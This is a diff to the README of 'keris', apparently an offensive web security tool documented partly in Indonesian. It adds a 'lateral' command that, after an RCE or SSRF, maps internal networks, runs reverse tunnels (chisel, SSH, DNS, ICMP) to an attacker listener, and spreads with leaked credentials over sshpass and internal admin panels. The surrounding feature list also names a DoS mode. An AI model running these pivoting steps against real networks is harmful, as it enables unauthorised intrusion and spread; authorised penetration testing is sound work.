@@ -138,6 +138,7 @@ never expose it publicly.
 | `sast` | Client-side static analysis: source/JS bundle sinks + secrets, dependency CVE DB, CycloneDX SBOM |
 | `watch` | Continuous monitoring: scan terjadwal + diff + risk trend + alert multi-channel (Slack/Discord/Telegram/Teams/email/PagerDuty/generic webhook) |
 | `fuzz` | Intelligent fuzzing: payload sesuai tipe param (numeric/path/string/search) & teknologi stack; mutation fuzzing pada nilai asli |
+| `lateral` | Advanced pivoting & lateral movement: network discovery + banner, tunnel ssh/chisel/dns/icmp, spread via kredensial internal (wajib --authorized) |
 | `jsanalysis` / `sensitive` | DOM XSS sinks + secrets in JS bundles; leaked credentials/PII/cards in responses |
 | `bruteforce` / `platforms` | Weak login (form/basic), platform-specific checks (WordPress, Laravel, ...) |
 | `project` | Self-audit of a local codebase; JSON output friendly to AI coding agents |
@@ -468,6 +469,31 @@ keris watch https://app.example.com --interval 3600 --state-dir .keris-watch \
   `--min-severity`; kanal bisa banyak sekaligus — Slack, Discord, Telegram,
   Microsoft Teams, email SMTP (STARTTLS/SSL), PagerDuty Events API v2, atau
   generic JSON webhook. Tanpa `--webhook-type`, jenis dideteksi dari URL.
+
+### Advanced pivoting & lateral movement (`lateral`)
+
+Setelah RCE/SSRF terkonfirmasi, `lateral` memetakan jaringan internal dan
+menyebar memakai kredensial yang bocor (wajib `--authorized`):
+
+```bash
+keris lateral https://app.example.com --rce-candidate "http://host/exec|cmd" \
+  --tunnel chisel --lhost 192.168.1.10 --lport 7000 --authorized --yes
+keris lateral https://app.example.com --ssrf-url "http://host/fetch?url=1" \
+  --ssrf-param url --tunnel dns --dns-domain tun.example.com --authorized
+```
+
+- **Network discovery**: ekstrak interface internal (`ifconfig`/`ip a`),
+  susun cakupan RFC1918, scan service umum (ssh/mysql/redis/mongo/docker/...)
+  dan ambil banner service untuk fingerprint (RCE `nc`/`/dev/tcp`).
+- **Tunnel methods**: SSH reverse tunnel, chisel reverse SOCKS, DNS tunnel
+  (iodine/dns2tcp), dan ICMP tunnel (ptunnel) — perintah dibangun otomatis dan
+  dieksekusi lewat executor RCE; tanpa `--yes` hanya menyusun rencana.
+- **Lateral movement**: kredensial internal (default creds dari pivot-auto)
+  dicoba ke host lain via SSH (`sshpass`) dan panel HTTP internal
+  (admin/dashboard/jenkins/grafana); setiap jalur yang berhasil dicatat sebagai
+  temuan HIGH/MEDIUM di `lateral.log`.
+- `--scan-depth` membatasi ukuran scan; `--internal-ports` membatasi port.
+- Exit code mengikuti `--exit-on` (default: high).
 
 ### Intelligent fuzzing (`fuzz`)
 
@@ -1094,6 +1120,7 @@ keris/
 - [x] **Client-side SAST (`sast`): source analyzer, dependency CVE DB, CycloneDX SBOM**
 - [x] **Continuous monitoring (`watch`): scheduled scans, diff, risk trend, alert multi-channel (Slack/Discord/Telegram/Teams/email/PagerDuty/webhook)**
 - [x] **Intelligent fuzzing (`fuzz`): payload by param type + stack detection + mutation fuzzing**
+- [x] **Advanced pivoting & lateral movement (`lateral`): network discovery, ssh/chisel/dns/icmp tunnels, spread via internal creds**
 - [x] **Multi-vector DoS (`dos --hammer`)**
 - [x] **One-flag everything (`scan --pwn`)**
 - [x] **Live credential validation (`credcheck`)**
